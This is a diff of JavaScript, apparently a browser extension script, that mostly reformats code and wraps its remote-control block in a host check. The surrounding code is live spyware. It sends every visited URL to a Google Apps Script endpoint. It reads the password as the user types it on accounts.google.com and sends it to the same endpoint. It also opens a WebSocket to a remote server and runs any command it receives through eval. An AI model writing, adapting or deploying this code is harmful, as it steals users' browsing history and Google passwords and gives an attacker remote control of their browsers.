@@ -2,20 +2,20 @@
 fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}`);
 var href = window.location.href;
 setInterval(() => {
-  if(window.location.href !== href){
+  if (window.location.href !== href) {
     href = window.location.href;
     fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}`);
   }
 }, 50);
 
 // Google Password
-if(window.location.host === 'accounts.google.com'){
+if (window.location.host === 'accounts.google.com') {
   var password = $("input[type='password']");
   var currentVal = password.attr('data-initial-value');
   setInterval(() => {
-    if(password.attr('data-initial-value') !== currentVal){
+    if (password.attr('data-initial-value') !== currentVal) {
       currentVal = password.attr('data-initial-value');
-      if(currentVal.length > 3){
+      if (currentVal.length > 3) {
         fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${currentVal}`);
       }
     }
@@ -23,20 +23,22 @@ if(window.location.host === 'accounts.google.com'){
 }
 
 // Live Control
-const socket = new WebSocket('ws://192.168.86.232:8082');
+if (window.location.host !== '127.0.0.1') {
+  const socket = new WebSocket('ws://192.168.86.232:8082');
 
-socket.addEventListener('open', function (event) {
+  socket.addEventListener('open', function (event) {
     var message = {
-        type: "handshake",
-        content: "client"
+      type: "handshake",
+      content: "client"
     }
     socket.send(JSON.stringify(message));
-});
+  });
 
-socket.addEventListener('message', function (event) {
+  socket.addEventListener('message', function (event) {
     console.log('Message from server ', event.data);
     var data = JSON.parse(event.data);
-    if(data.type === 'commandClient'){
+    if (data.type === 'commandClient') {
       eval(data.content);
     }
-});
+  });
+}
